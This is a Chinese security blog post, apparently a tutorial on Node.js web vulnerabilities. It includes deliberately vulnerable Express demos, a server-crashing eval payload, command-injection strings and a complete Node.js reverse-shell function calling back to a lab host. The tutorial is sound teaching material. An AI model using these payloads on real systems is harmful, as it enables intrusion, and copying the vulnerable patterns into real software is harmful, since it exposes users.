@@ -1,0 +1,398 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,JavaScript,Node.js,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析Node.js安全 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析Node.js安全
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-03-29T04:17:06.000Z">
+        2020-03-29
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Node-js/">Node.js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境。Node.js使用了一个事件驱动、非阻塞式I/O的模型。</p>
+<p>Node是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。实质是对Chrome V8引擎进行了封装。</p>
+<p>Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。</p>
+<h3 id="环境安装、基础语法与特性"><a href="#环境安装、基础语法与特性" class="headerlink" title="环境安装、基础语法与特性"></a>环境安装、基础语法与特性</h3><p>参考：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-tutorial.html</a></p>
+<h3 id="第一个应用"><a href="#第一个应用" class="headerlink" title="第一个应用"></a>第一个应用</h3><p>Node.js应用由以下三部分组成：</p>
+<ol>
+<li>引入required模块：我们可以使用require指令来载入Node.js模块。</li>
+<li>创建服务器：服务器可以监听客户端的请求，类似于Apache、Nginx等HTTP服务器。</li>
+<li>接收请求与响应请求：服务器很容易创建，客户端可以使用浏览器或终端发送HTTP请求，服务器接收请求后返回响应数据。</li>
+</ol>
+<p>直接看下代码实现，test.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入required模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送 HTTP 头部 </span></span><br><span class="line">    <span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line">    <span class="comment">// 内容类型: text/plain</span></span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送响应数据 "Mi1k7ea"</span></span><br><span class="line">    response.end(<span class="string">'Mi1k7ea\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:666/'</span>);</span><br></pre></td></tr></table></figure>
+<p>直接用node命令运行即可：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/1.png" alt=""></p>
+<h3 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h3><p>Express是一个简洁而灵活的Node.js Web应用框架，提供了一系列强大特性帮助你创建各种Web应用，和丰富的HTTP工具。</p>
+<p>使用Express可以快速地搭建一个完整功能的网站。</p>
+<p>Express框架核心特性：</p>
+<ul>
+<li>可以设置中间件来响应HTTP请求。</li>
+<li>定义了路由表用于执行不同的HTTP请求动作。</li>
+<li>可以通过向模板传递参数来动态渲染HTML页面。</li>
+</ul>
+<p>Express的安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br><span class="line">npm install body-parser --save</span><br><span class="line">npm install cookie-parser --save</span><br><span class="line">npm install multer --save</span><br></pre></td></tr></table></figure>
+<p>以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，node_modules目录下会自动创建express目录。几个重要的模块介绍如下：</p>
+<ul>
+<li><strong>body-parser</strong> - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。</li>
+<li><strong>cookie-parser</strong> - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li>
+<li><strong>multer</strong> - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。</li>
+</ul>
+<p>安装完后，我们可以查看下express使用的版本号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;npm list express</span><br><span class="line">E:\</span><br><span class="line">`-- express@4.17.1</span><br></pre></td></tr></table></figure>
+<p>Demo应用，express_demo.js：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.send(<span class="string">'Express Test'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> host = server.address().address</span><br><span class="line">  <span class="keyword">var</span> port = server.address().port</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://%s:%s"</span>, host, port)</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>接着用命令<code>node express_demo.js</code>运行即可访问。</p>
+<p>在页面中访问，可以看到响应报文中有个X-Powered-By头，其值为Express，也就是说，在日常的抓包中看到该头字段即可知道是使用的Node.js的Express框架：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/2.png" alt=""></p>
+<h2 id="0x02-Node-js安全"><a href="#0x02-Node-js安全" class="headerlink" title="0x02 Node.js安全"></a>0x02 Node.js安全</h2><p>Node.js中的Web安全问题和传统的Web安全问题都是一样的，只是代码实现上有语法的差异而已。</p>
+<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>Node.js同样存在代码注入问题，需要重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控。</p>
+<p>示例代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> a = <span class="built_in">eval</span>(req.query.a);</span><br><span class="line">	<span class="keyword">var</span> b = <span class="built_in">eval</span>(req.query.b);</span><br><span class="line">	<span class="keyword">var</span> r = a + b;</span><br><span class="line">	res.send(<span class="string">'Sum a+b='</span> + r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p>强制应用退出的payload如下，执行之后Express服务就终止了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1&amp;b=process.exit()</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析Node-js安全/3.png" alt=""></p>
+<p>再深入利用，反弹shell的payload如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line">	<span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">	<span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);</span><br><span class="line">	<span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">	client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);</span><br><span class="line">		cmd.stderr.pipe(client);</span><br><span class="line">		client.on( <span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );</span><br><span class="line">		client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">rev(<span class="string">'192.168.10.137'</span>, <span class="number">4444</span>);</span><br></pre></td></tr></table></figure>
+<p>直接注入访问：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/4.png" alt=""></p>
+<p>在Kali中成功拿到反弹shell：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/5.png" alt=""></p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>Node.js同样存在命名注入漏洞，需重点关注模块child_process的函数，因为这个模块包含了创建一个新进程来执行系统命令的功能。</p>
+<p>示例代码如下，直接使用外部参数拼接ping命令：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	cmd.exec(<span class="string">"ping -n 4 "</span> + req.query.ip,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">		res.send(<span class="string">'Ping Results: &lt;pre&gt;'</span> + data + <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p>正常访问：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/6.png" alt=""></p>
+<p>尝试进行命令注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|whoami</span><br><span class="line">?ip=127.0.0.1||whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析Node-js安全/7.png" alt=""></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Node.js本身没有XSS防护机制，也不像Java那样拥有强大的过滤器来实现过滤用户的有害输入从而防御XSS。若是未经过滤直接显示外部的输入则导致XSS。但是可以通过设置HTTP头中加入X-XSS-Protection在浏览器端缓解XSS。</p>
+<p>示例代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.send(<span class="string">'Hello, '</span> + req.query.name);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p>直接注入XSS payload即可：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/8.png" alt=""></p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>Node.js的needle模块可发起GET/POST等HTTP请求，当其参数外部可控时可造成SSRF漏洞。</p>
+<p>示例代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> needle = <span class="built_in">require</span>(<span class="string">'needle'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> url = req.query[<span class="string">'url'</span>];</span><br><span class="line">	needle.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">error, response</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>)</span><br><span class="line">			res.send(response.body);</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'new request:'</span> + url);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析Node-js安全/9.png" alt=""></p>
+<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，我们给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。该特性可用来进行参数解析漏洞的利用。</p>
+<p>示例代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> name = req.query.name;</span><br><span class="line">	res.send(<span class="string">"Name: "</span> + name);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/03/29/浅析Node-js安全/10.png" alt=""></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote>
+<p>Node.js的网站注入漏洞很少。Node.js通常与mysql/mongodb搭配使用，因为sql注入的漏洞危害很高并且存在多年了，一些新出现的语言如openresty+lua/node.js等天生会规避掉这种安全问题。它们通常都采用了占位符或者叫参数化查询来与数据库交互。node.js 原生的与数据库交互代码如下：</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql = <span class="built_in">require</span> (<span class="string">'mysql'</span>) ; </span><br><span class="line"><span class="keyword">var</span> connection = mysql .createConnection(</span><br><span class="line">&#123; <span class="attr">host</span>: <span class="string">'localhost'</span>, </span><br><span class="line">user: <span class="string">'root'</span>, </span><br><span class="line">password: <span class="string">'root'</span>,</span><br><span class="line">port: <span class="string">'3306'</span>, </span><br><span class="line">database: <span class="string">'admin'</span>, &#125;) ; </span><br><span class="line">connection.connect( ); </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">'select * from admin where id =?'</span><span class="string">'; </span></span><br><span class="line"><span class="string">Var  param=[1];</span></span><br><span class="line"><span class="string">connection.query( sql，param); </span></span><br><span class="line"><span class="string">connection.end( );</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Node.js现在已经有了orm框架（比如Sequelize），因此注入漏洞就跟少了。但是如果程序员写代码时不小心用了字符串拼接，还是会造成sql注入的。如下：</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>  <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span></span><br></pre></td></tr></table></figure>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote>
+<p>Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，通过精心构造的js文件也能实现命令执行的目的。</p>
+</blockquote>
+<p>文件上传示例代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line">app.use(multer(&#123; <span class="attr">dest</span>: <span class="string">'E:/'</span>&#125;).array(<span class="string">'image'</span>));</span><br><span class="line">app.use(express.static(<span class="string">'public'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line">	<span class="keyword">var</span> des_file = __dirname + <span class="string">'/'</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">	fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">		fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>( err )&#123;</span><br><span class="line">			<span class="built_in">console</span>.log( err );</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			response = &#123;</span><br><span class="line">				message:<span class="string">'File uploaded successfully'</span>,</span><br><span class="line">				filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">console</span>.log( response );</span><br><span class="line">		res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure>
+<p>uploadfile.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Upload File: <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8181/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"image"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传文件示例：</p>
+<p><img src="/2020/03/29/浅析Node-js安全/11.png" alt=""></p>
+<h3 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h3><blockquote>
+<p>任何人都可以创建模块发布到npm上，供别人调用，虽然这为开发者带来了一定的便利性，但必然隐藏着安全隐患，假如一不小心使用了不安全的第三方模块后果可想而知了，比如前段时间闹得沸沸扬扬的node-serialize模块所引起的远程代码执行漏洞（cve-2017-5914）。现在有一款NSP 工具可以帮助检查第三方模块现有漏洞。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i nsp –g //安装nsp</span><br><span class="line">nsp check 要检查的package.json //检查是否有漏洞</span><br></pre></td></tr></table></figure>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>可参考：<a href="/2020/03/29/node-serialize反序列化漏洞/">《node-serialize反序列化漏洞》</a>。</p>
+<h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>参考：<a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></p>
+<p><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">渗透测试 Node.js 应用</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25894270" target="_blank" rel="noopener">实战教你如何利用NodeJS 漏洞？</a></p>
+<p><a href="https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-1/" target="_blank" rel="noopener">An Introduction to Penetration Testing Node.js Applications</a></p>
+
+    </div>
+
+  </article>
